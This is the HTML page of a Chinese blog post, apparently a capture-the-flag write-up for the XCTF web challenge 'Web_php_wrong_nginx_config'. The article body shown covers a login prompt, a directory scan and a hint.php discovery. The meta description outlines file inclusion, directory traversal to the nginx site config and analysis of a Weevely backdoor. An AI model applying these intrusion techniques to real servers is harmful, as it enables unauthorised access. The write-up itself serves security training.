@@ -1,0 +1,1392 @@
+<!DOCTYPE html>
+
+<head>
+	
+	<title>攻防世界Web_php_wrong_nginx_config - wanan</title>
+	<meta charset="utf-8">
+	
+		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+	
+	<meta name="description" content="文件包含,目录遍历,分析Weevely后门代码,写解密函数 弹出登录 扫一下目录  发现  hint.php   &#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;site.conf 说文件的配置可能有问题,该文件应该是nginx的站点核心配置文件之一 Hack.php 访问改文件得到一个空白页面,猜测改文件没有直接输出任何语句 &#x2F;admin |">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防世界Web_php_wrong_nginx_config">
+<meta property="og:url" content="https://lovewanan.github.io/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb_php_wrong_nginx_config/index.html">
+<meta property="og:site_name" content="wanan">
+<meta property="og:description" content="文件包含,目录遍历,分析Weevely后门代码,写解密函数 弹出登录 扫一下目录  发现  hint.php   &#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;site.conf 说文件的配置可能有问题,该文件应该是nginx的站点核心配置文件之一 Hack.php 访问改文件得到一个空白页面,猜测改文件没有直接输出任何语句 &#x2F;admin |">
+<meta property="og:locale">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208971.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208978.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208975.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208974.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208977.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208987.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208178.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208184.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208193.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208476.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208491.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208493.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208502.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208500.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208514.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208866.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208876.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208893.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208898.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208904.png">
+<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208908.png">
+<meta property="article:published_time" content="2022-03-09T11:00:36.000Z">
+<meta property="article:modified_time" content="2022-03-14T11:35:18.080Z">
+<meta property="article:author" content="wanan">
+<meta property="article:tag" content="攻防世界">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208971.png">
+
+	<meta name="theme-color" content="#5e72e4">
+	<meta name="theme-color-rgb" content="94,114,228">
+	<meta name="theme-color-origin" content="#5e72e4">
+	<meta name="argon-enable-custom-theme-color" content="true">
+	<meta name="theme-card-radius" content="4">
+	<meta name="theme-version" content="1.0.2">
+	<link rel="icon" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/wanan.ico" type="image/x-icon">
+	<link rel="shortcut icon" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/wanan.ico" type="image/x-icon">
+
+	
+<link rel="stylesheet" href="/assets/argon_css_merged.css">
+
+	
+<link rel="stylesheet" href="/style.css">
+
+	
+<link rel="stylesheet" href="//fonts.loli.net/css?family=Open+Sans:300,400,600,700|Noto+Serif+SC:300,600&display=swap.css">
+
+	
+<script src="/assets/argon_js_merged.js"></script>
+
+	
+<script src="/assets/js/argon.min.js"></script>
+
+	
+<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+	
+
+	<script>
+		var argonConfig = {
+			language: "zh_CN",
+			
+				zoomify: {
+					duration: 200,
+					easing: "cubic-bezier(0.4,0,0,1)",
+					scale: 0.9
+				},
+			
+			pangu: "false",
+			
+				lazyload: {
+					threshold: 800,
+					effect: "fadeIn"
+				},
+			
+			disable_pjax: false,
+			headroom: false
+		}
+	</script>
+	<script>
+		var darkmodeAutoSwitch = "false";
+		function setDarkmode(enable){
+			if (enable == true){
+				$("html").addClass("darkmode");
+			}else{
+				$("html").removeClass("darkmode");
+			}
+			$(window).trigger("scroll");
+		}
+		function toggleDarkmode(){
+			if ($("html").hasClass("darkmode")){
+				setDarkmode(false);
+				sessionStorage.setItem("Argon_Enable_Dark_Mode", "false");
+			}else{
+				setDarkmode(true);
+				sessionStorage.setItem("Argon_Enable_Dark_Mode", "true");
+			}
+		}
+		if (sessionStorage.getItem("Argon_Enable_Dark_Mode") == "true"){
+			setDarkmode(true);
+		}
+		function toggleDarkmodeByPrefersColorScheme(media){
+			if (sessionStorage.getItem('Argon_Enable_Dark_Mode') == "false" || sessionStorage.getItem('Argon_Enable_Dark_Mode') == "true"){
+				return;
+			}
+			if (media.matches){
+				setDarkmode(true);
+			}else{
+				setDarkmode(false);
+			}
+		}
+		function toggleDarkmodeByTime(){
+			if (sessionStorage.getItem('Argon_Enable_Dark_Mode') == "false" || sessionStorage.getItem('Argon_Enable_Dark_Mode') == "true"){
+				return;
+			}
+			let hour = new Date().getHours();
+			if (hour < 7 || hour >= 22){
+				setDarkmode(true);
+			}else{
+				setDarkmode(false);
+			}
+		}
+		if (darkmodeAutoSwitch == 'system'){
+			var darkmodeMediaQuery = window.matchMedia("(prefers-color-scheme: dark)");
+			darkmodeMediaQuery.addListener(toggleDarkmodeByPrefersColorScheme);
+			toggleDarkmodeByPrefersColorScheme(darkmodeMediaQuery);
+		}
+		if (darkmodeAutoSwitch == 'time'){
+			toggleDarkmodeByTime();
+		}
+		if (darkmodeAutoSwitch == 'alwayson'){
+			setDarkmode(true);
+		}
+
+		function toggleAmoledDarkMode(){
+			$("html").toggleClass("amoled-dark");
+			if ($("html").hasClass("amoled-dark")){
+				localStorage.setItem("Argon_Enable_Amoled_Dark_Mode", "true");
+			}else{
+				localStorage.setItem("Argon_Enable_Amoled_Dark_Mode", "false");
+			}
+		}
+		if (localStorage.getItem("Argon_Enable_Amoled_Dark_Mode") == "true"){
+			$("html").addClass("amoled-dark");
+		}else if (localStorage.getItem("Argon_Enable_Amoled_Dark_Mode") == "false"){
+			$("html").removeClass("amoled-dark");
+		}
+	</script>
+	<script>
+		if (navigator.userAgent.indexOf("Safari") !== -1 && navigator.userAgent.indexOf("Chrome") === -1){
+			$("html").addClass("using-safari");
+		}
+	</script>
+
+	
+		
+<script src="/assets/vendor/smoothscroll/smoothscroll1.js"></script>
+
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+
+<style id="themecolor_css">
+	
+	:root{
+		--themecolor: #5e72e4;
+		--themecolor-dark0: #5368E2;
+		--themecolor-dark: #485FE0;
+		--themecolor-dark2: #324CDD;
+		--themecolor-dark3: #233DD2;
+		--themecolor-light: #8A98EB;
+		--themecolor-rgbstr: 94,114,228;
+		--themecolor-gradient: linear-gradient(150deg,var(--themecolor-light) 15%, var(--themecolor) 70%, var(--themecolor-dark0) 94%);
+
+	}
+</style>
+<style id="theme_cardradius_css">
+	:root{
+		--card-radius: 4px;
+	}
+</style>
+
+<body>
+<div id="toolbar">
+	<header class="header-global">
+		<nav id="navbar-main" class="navbar navbar-main navbar-expand-lg navbar-transparent navbar-light bg-primary headroom--not-bottom headroom--not-top headroom--pinned">
+			<div class="container">
+				
+				<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbar_global" aria-controls="navbar_global" aria-expanded="false" aria-label="Toggle navigation">
+					<span class="navbar-toggler-icon"></span>
+				</button>
+				<a class="navbar-brand" href="/">wanan</a>
+				<div class="navbar-collapse collapse" id="navbar_global">
+					<div class="navbar-collapse-header">
+						<div class="row">
+							<div class="col-6 collapse-brand"></div>
+							<div class="col-6 collapse-close">
+								<button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbar_global" aria-controls="navbar_global" aria-expanded="false" aria-label="Toggle navigation">
+									<span></span>
+									<span></span>
+								</button>
+							</div>
+						</div>
+					</div>
+					<ul id="navbar_search_btn_mobile" class="navbar-nav align-items-lg-center ml-lg-auto">
+						<li class="nav-item" data-toggle="modal" data-target="#argon_search_modal" style="padding-left: 5px;">
+							<a class="nav-link nav-link-icon">
+								<i class="fa fa-search"></i>
+								<span class="nav-link-inner--text d-lg-none">搜索</span>
+							</a>
+						</li>
+					</ul>
+					
+							<ul class='navbar-nav navbar-nav-hover align-items-lg-center'>
+								
+										<li class='nav-item'>
+											<a href='/' class='nav-link' >
+												<i class='ni ni-book-bookmark d-lg-none'></i>
+												<span class='nav-link-inner--text'>首页</span>
+											</a>
+											
+										</li>
+									
+										<li class='nav-item dropdown'>
+											<a href='' class='nav-link' onclick='return false;' data-toggle='dropdown' no-pjax>
+												<i class='ni ni-book-bookmark d-lg-none'></i>
+												<span class='nav-link-inner--text'>分类</span>
+											</a>
+											
+													<div class="dropdown-menu">
+														
+															<a href='/categories/ctf/' class='dropdown-item'>ctf</a>
+														
+															<a href='/categories/ctf/sql%E6%B3%A8%E5%85%A5/' class='dropdown-item'>sql注入</a>
+														
+															<a href='/categories/java%E7%9F%A5%E8%AF%86/' class='dropdown-item'>java知识</a>
+														
+															<a href='/categories/ctf/php%E7%9F%A5%E8%AF%86' class='dropdown-item'>php知识</a>
+														
+															<a href='/categories/BUUCTF' class='dropdown-item'>BUUCTF</a>
+														
+															<a href='/categories/Linux' class='dropdown-item'>Linux</a>
+														
+															<a href='/categories/ctfshow' class='dropdown-item'>ctf.show</a>
+														
+													</div>
+												
+										</li>
+									
+							</ul>
+						
+					<ul class="navbar-nav align-items-lg-center ml-lg-auto">
+						<li class="nav-item" data-toggle="modal" data-target="#argon_search_modal" id="navbar_search_btn_pc">
+							<a class="nav-link nav-link-icon">
+								<i class="fa fa-search"></i>
+								<span class="nav-link-inner--text d-lg-none">搜索</span>
+							</a>
+						</li>
+					</ul>
+				</div>
+				
+				<div id="navbar_menu_mask" data-toggle="collapse" data-target="#navbar_global"></div>
+			</div>
+		</nav>
+	</header>
+</div>
+<div class="modal fade" id="argon_search_modal" tabindex="-1" role="dialog" aria-labelledby="" aria-hidden="true">
+	<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
+		<div class="modal-content">
+			<div class="modal-header">
+				<h5 class="modal-title">搜索</h5>
+				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+					<span aria-hidden="true">&times;</span>
+				</button>
+			</div>
+			<div class="modal-body">
+				<!-- TODO -->
+<div class="form-group mb-3">
+	<div class="input-group input-group-alternative">
+		<div class="input-group-prepend">
+			<span class="input-group-text"><i class="fa fa-search"></i></span>
+		</div>
+		<input id="local-search-input" class="form-control" placeholder="搜索什么..." type="text"  autocomplete="off" data-search.path="search.xml" data-config.root="/">
+	</div>
+	<div id="local-search-result"></div>
+</div>
+
+			</div>
+		</div>
+	</div>
+</div>
+<!--Banner-->
+<section id="banner" class="banner section section-lg section-shaped">
+	<div class="shape shape-style-1 shape-primary">
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+	</div>
+
+	
+	<div id="banner_container" class="banner-container container text-center">
+		
+			<div class="banner-title text-white"><span class="banner-title-inner">wanan</span>
+		
+		</div>
+	</div>
+	
+		<style>
+			section.banner{
+				background-image: url(/assets/img/banner.jpg) !important;
+			}
+		</style>
+	
+</section>
+
+
+	<style>
+		#content:before {
+			content: '';
+			display: block;
+			position: fixed;
+			left: 0;
+			right: 0;
+			top: 0;
+			bottom: 0;
+			z-index: -2;
+			background: url(/assets/img/banner.jpg);
+			background-position: center;
+			background-size: cover;
+			background-repeat: no-repeat;
+			opacity: 1;
+			transition: opacity .5s ease;
+		}
+		html.darkmode #content:before{
+			filter: brightness(0.65);
+		}
+		
+			#content:after {
+				content: '';
+				display: block;
+				position: fixed;
+				left: 0;
+				right: 0;
+				top: 0;
+				bottom: 0;
+				z-index: -2;
+				background: url(/assets/img/banner.jpg);
+				background-position: center;
+				background-size: cover;
+				background-repeat: no-repeat;
+				opacity: 0;
+				transition: opacity .5s ease;
+			}
+			html.darkmode #content:after {
+				opacity: 1;
+			}
+			html.darkmode #content:before {
+				opacity: 0;
+			}
+		
+		
+			#banner, #banner .shape {
+				background: transparent !important;
+			}
+		
+	</style>
+
+
+
+
+<div id="float_action_buttons" class="float-action-buttons fabtns-unloaded">
+	<button id="fabtn_toggle_sides" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-hidden="true" tooltip-move-to-left="移至左侧" tooltip-move-to-right="移至右侧">
+		<span class="btn-inner--icon fabtn-show-on-right"><i class="fa fa-caret-left"></i></span>
+		<span class="btn-inner--icon fabtn-show-on-left"><i class="fa fa-caret-right"></i></span>
+	</button>
+	<button id="fabtn_back_to_top" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-label="Back To Top" tooltip="回到顶部">
+		<span class="btn-inner--icon"><i class="fa fa-angle-up"></i></span>
+	</button>
+	<button id="fabtn_go_to_comment" class="btn btn-icon btn-neutral fabtn shadow-sm d-none" type="button" <-% theme.fab_show_gotocomment_button ? "" : "style='display: none;'"  aria-label="Comment" tooltip="评论">
+		<span class="btn-inner--icon"><i class="fa fa-comment-o"></i></span>
+	</button>
+	<button id="fabtn_toggle_darkmode" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" <-% theme.fab_show_darkmode_button ? "" : "style='display: none;'"  aria-label="Toggle Darkmode" tooltip-darkmode="夜间模式" tooltip-blackmode="暗黑模式" tooltip-lightmode="日间模式">
+		<span class="btn-inner--icon"><i class="fa fa-moon-o"></i><i class='fa fa-lightbulb-o'></i></span>
+	</button>
+	<button id="fabtn_toggle_blog_settings_popup" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" <-% theme.fab_show_settings_button ? "" : "style='display: none;'"  aria-label="Open Blog Settings Menu" tooltip="设置">
+		<span class="btn-inner--icon"><i class="fa fa-cog"></i></span>
+	</button>
+	<div id="fabtn_blog_settings_popup" class="card shadow-sm" style="opacity: 0;" aria-hidden="true">
+		<div id="close_blog_settings"><i class="fa fa-close"></i></div>
+		<div class="blog-setting-item mt-3">
+			<div style="transform: translateY(-4px);"><div id="blog_setting_toggle_darkmode_and_amoledarkmode" tooltip-switch-to-darkmode="切换到夜间模式" tooltip-switch-to-blackmode="切换到暗黑模式"><span>夜间模式</span><span>暗黑模式</span></div></div>
+			<div style="flex: 1;"></div>
+			<label id="blog_setting_darkmode_switch" class="custom-toggle">
+				<span class="custom-toggle-slider rounded-circle"></span>
+			</label>
+		</div>
+		<div class="blog-setting-item mt-3">
+			<div style="flex: 1;">字体</div>
+			<div>
+				<button id="blog_setting_font_sans_serif" type="button" class="blog-setting-font btn btn-outline-primary blog-setting-selector-left">Sans Serif</button><button id="blog_setting_font_serif" type="button" class="blog-setting-font btn btn-outline-primary blog-setting-selector-right">Serif</button>
+			</div>
+		</div>
+		<div class="blog-setting-item mt-3">
+			<div style="flex: 1;">阴影</div>
+			<div>
+				<button id="blog_setting_shadow_small" type="button" class="blog-setting-shadow btn btn-outline-primary blog-setting-selector-left">浅阴影</button><button id="blog_setting_shadow_big" type="button" class="blog-setting-shadow btn btn-outline-primary blog-setting-selector-right">深阴影</button>
+			</div>
+		</div>
+		<div class="blog-setting-item mt-3 mb-3">
+			<div style="flex: 1;">滤镜</div>
+			<div id="blog_setting_filters" class="ml-3">
+				<button id="blog_setting_filter_off" type="button" class="blog-setting-filter-btn ml-0" filter-name="off">关闭</button>
+				<button id="blog_setting_filter_sunset" type="button" class="blog-setting-filter-btn" filter-name="sunset">日落</button>
+				<button id="blog_setting_filter_darkness" type="button" class="blog-setting-filter-btn" filter-name="darkness">暗化</button>
+				<button id="blog_setting_filter_grayscale" type="button" class="blog-setting-filter-btn" filter-name="grayscale">灰度</button>
+			</div>
+		</div>
+		<div class="blog-setting-item mb-3">
+			<div id="blog_setting_card_radius_to_default" style="cursor: pointer;" tooltip="恢复默认">圆角</div>
+			<div style="flex: 1;margin-left: 20px;margin-right: 8px;transform: translateY(2px);">
+				<div id="blog_setting_card_radius"></div>
+			</div>
+		</div>
+		
+			<div class="blog-setting-item mt-1 mb-3">
+				<div style="flex: 1;">主题色</div>
+				<div id="theme-color-picker" class="ml-3"></div>
+			</div>
+		
+	</div>
+	<button id="fabtn_open_sidebar" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-label="Open Sidebar Menu" tooltip="菜单">
+		<span class="btn-inner--icon"><i class="fa fa-bars"></i></span>
+	</button>
+	<button id="fabtn_reading_progress" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-hidden="true" tooltip="阅读进度">
+		<div id="fabtn_reading_progress_bar" style="width: 0%;"></div>
+		<span id="fabtn_reading_progress_details">0%</span>
+	</button>
+</div>
+
+<div id="content" class="site-content">
+
+
+	<script src="https://cdn.jsdelivr.net/npm/@waline/client"></script>
+
+
+
+	<script>
+		var _hmt = _hmt || [];
+		(function() {
+		  var hm = document.createElement("script");
+		  hm.src = "https://hm.baidu.com/hm.js?853baf6befa4784c85c2f47223a04efb" ;
+		  var s = document.getElementsByTagName("script")[0]; 
+		  s.parentNode.insertBefore(hm, s);
+		})();
+		</script>
+		
+
+
+
+
+
+
+<div class="page-information-card-container">
+	
+</div>
+
+<div id="sidebar_mask"></div>
+<aside id="leftbar" class="leftbar widget-area" role="complementary">
+		
+		<div id="leftbar_part1" class="widget widget_search card bg-white shadow-sm border-0">
+			<div class="leftbar-banner card-body">
+				<span class="leftbar-banner-title text-white">wanan</span>
+				
+				
+			</div>
+			
+			
+				<ul id='leftbar_part1_menu' class='leftbar-menu'>
+					<li class='leftbar-menu-item'><a href='/'>首页</a></li><li class='leftbar-menu-item'><a href='/archives'>归档</a></li>
+				</ul>
+			
+			<div class="card-body text-center leftbar-search-button">
+				<button id="leftbar_search" class="btn btn-secondary btn-lg active btn-sm btn-block border-0" role="button" data-toggle="modal" data-target="#argon_search_modal" >
+					<i class="menu-item-icon fa fa-search mr-0"></i> 搜索
+				</button>
+			</div>
+		</div>
+		<div id="leftbar_part2" class="widget widget_search card bg-white shadow-sm border-0">
+			<div id="leftbar_part2_inner" class="card-body">
+				
+				<div class="nav-wrapper" style="padding-top: 5px;">
+	                <ul class="nav nav-pills nav-fill" role="tablist">
+						
+							<li class="nav-item sidebar-tab-switcher">
+								<a class="active show" id="leftbar_tab_catalog_btn" data-toggle="tab" href="#leftbar_tab_catalog" role="tab" aria-controls="leftbar_tab_catalog" no-pjax>文章目录</a>
+							</li>
+						
+						<li class="nav-item sidebar-tab-switcher">
+							<a class="" id="leftbar_tab_overview_btn" data-toggle="tab" href="#leftbar_tab_overview" role="tab" aria-controls="leftbar_tab_overview" no-pjax>站点概览</a>
+						</li>
+	                </ul>
+				</div>
+				<div>
+					<div class="tab-content" style="padding: 10px 10px 0 10px;">
+						
+							<div class="tab-pane fade active show" id="leftbar_tab_catalog" role="tabpanel" aria-labelledby="leftbar_tab_catalog_btn">
+								<div id="leftbar_catalog"></div>
+								<script type="text/javascript">
+									$(function () {
+										$(document).headIndex({
+											articleWrapSelector: '#post_content',
+											indexBoxSelector: '#leftbar_catalog',
+											subItemBoxClass: "index-subItem-box",
+											itemClass: "index-item",
+											linkClass: "index-link",
+											offset: 80,
+										});
+									})
+								</script>
+								
+							</div>
+						
+						<div class="tab-pane fade text-center" id="leftbar_tab_overview" role="tabpanel" aria-labelledby="leftbar_tab_overview_btn">
+							<img id="leftbar_overview_author_image" src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092159138.jpeg" class="img-fluid rounded-circle shadow-sm" style="width: 100px;" alt="avatar">
+							<h6 id="leftbar_overview_author_name">wanan</h6>
+							<nav class="site-state">
+								<div class="site-state-item site-state-posts">
+									<a href="/archives">
+										<span class="site-state-item-count">58</span>
+										<span class="site-state-item-name">文章</span>
+									</a>
+								</div>
+								<div class="site-state-item site-state-categories">
+									<a data-toggle="modal" data-target="#blog_categories">
+										<span class="site-state-item-count">7</span>
+										<span class="site-state-item-name">分类</span>
+									</a>
+								</div>      
+								<div class="site-state-item site-state-tags">
+									<a data-toggle="modal" data-target="#blog_tags">
+										<span class="site-state-item-count">7</span>
+										<span class="site-state-item-name">标签</span>
+									</a>
+								</div>
+							</nav>
+							
+									<div class="site-author-links">
+										
+									</div>
+								
+							
+									<div class='site-friend-links'>
+										<div class='site-friend-links-title'><i class='fa fa-fw fa-link'></i> Links</div>
+										<ul class='site-friend-links-ul'>
+											
+												<li class='site-friend-links-item'>
+													<a href='https://argon-docs.solstice23.top/#/' rel='noopener' target='_blank'>Argon</a>
+												</li>
+											
+										</ul>
+									</div>
+								
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+</aside>
+<div class="modal fade" id="blog_categories" tabindex="-1" role="dialog" aria-labelledby="" aria-hidden="true">
+	<div class="modal-dialog modal-dialog-centered">
+		<div class="modal-content">
+			<div class="modal-header">
+				<h5 class="modal-title">分类</h5>
+				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+					<span aria-hidden="true">&times;</span>
+				</button>
+			</div>
+			<div class="modal-body">
+				<a class="badge badge-secondary tag" href="/categories/BUUCTF/" rel="tag">BUUCTF <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/categories/Linux/" rel="tag">Linux <span class="tag-num">7</span></a><a class="badge badge-secondary tag" href="/categories/ctf/" rel="tag">ctf <span class="tag-num">26</span></a><a class="badge badge-secondary tag" href="/categories/ctfshow/" rel="tag">ctfshow <span class="tag-num">23</span></a><a class="badge badge-secondary tag" href="/categories/java%E7%9F%A5%E8%AF%86/" rel="tag">java知识 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/categories/ctf/php%E7%9F%A5%E8%AF%86/" rel="tag">php知识 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/categories/ctf/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入 <span class="tag-num">2</span></a>
+			</div>
+		</div>
+	</div>
+</div>
+<div class="modal fade" id="blog_tags" tabindex="-1" role="dialog" aria-labelledby="" aria-hidden="true">
+	<div class="modal-dialog modal-dialog-centered">
+		<div class="modal-content">
+			<div class="modal-header">
+				<h5 class="modal-title">标签</h5>
+				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+					<span aria-hidden="true">&times;</span>
+				</button>
+			</div>
+			<div class="modal-body">
+				<a class="badge badge-secondary tag" href="/tags/BUUCTF/" rel="tag">BUUCTF <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/Linux/" rel="tag">Linux <span class="tag-num">7</span></a><a class="badge badge-secondary tag" href="/tags/bugctf/" rel="tag">bugctf <span class="tag-num">2</span></a><a class="badge badge-secondary tag" href="/tags/ctf-show/" rel="tag">ctf.show <span class="tag-num">23</span></a><a class="badge badge-secondary tag" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/xctf/" rel="tag">xctf <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag">攻防世界 <span class="tag-num">9</span></a>
+			</div>
+		</div>
+	</div>
+</div>
+
+
+<div id="primary" class="content-area">
+	<main id="main" class="site-main" role="main">
+		
+		
+			
+	<article class="post post-full card bg-white shadow-sm border-0 ">
+	<header class="post-header text-center">
+		
+		<a class="post-title" href="/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb_php_wrong_nginx_config/">攻防世界Web_php_wrong_nginx_config</a>
+		<div class="post-meta">
+			
+						
+						<div class="post-meta-detail post-meta-detail-time">
+							<i class="fa fa-clock-o" aria-hidden="true"></i>
+							<time title="发布于 2022-3-9 19:00:36 | 编辑于 2022-3-14 19:35:18">2022-3-9 19:00
+							</time>
+						</div>
+					
+						
+							<div class="post-meta-devide">|</div>
+						
+						<div class="post-meta-detail post-meta-detail-categories">
+							<i class="fa fa-bookmark-o" aria-hidden="true"></i>
+							<a class="post-meta-detail-catagory-link" href="/categories/ctf/">ctf</a>
+						</div>
+					
+						
+							<div class="post-meta-devide">|</div>
+						
+						<div class="post-meta-detail post-meta-detail-words">
+							<i class="fa fa fa-book" aria-hidden="true"></i>
+							<span id="busuanzi_container_page_pv">
+								阅读<span id="busuanzi_value_page_pv"></span>次
+							</span>
+						</div>
+					
+						
+							<div class="post-meta-devide">|</div>
+						
+						<div class="post-meta-detail post-meta-detail-words">
+							<i class="fa fa-file-word-o" aria-hidden="true"></i>
+							6.3k 字
+						</div>
+					
+						
+							<div class="post-meta-devide">|</div>
+						
+						<div class="post-meta-detail post-meta-detail-readingtime">
+							<i class="fa fa-hourglass-end" aria-hidden="true"></i>
+							26 分钟
+						</div>
+					
+		</div>
+		
+	</header>
+
+	<div class="post-content" id="post_content">
+		<h1 id="文件包含-目录遍历-分析Weevely后门代码-写解密函数"><a href="#文件包含-目录遍历-分析Weevely后门代码-写解密函数" class="headerlink" title="文件包含,目录遍历,分析Weevely后门代码,写解密函数"></a>文件包含,目录遍历,分析Weevely后门代码,写解密函数</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208971.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="1646466067424"></p>
+
+<p>弹出登录</p>
+<p>扫一下目录</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208978.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="1646466135692"></p>
+
+<p>发现</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208975.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="1646466159066"></p>
+
+<p><strong>hint.php</strong></p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092208974.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="1646466609529"></p>
+
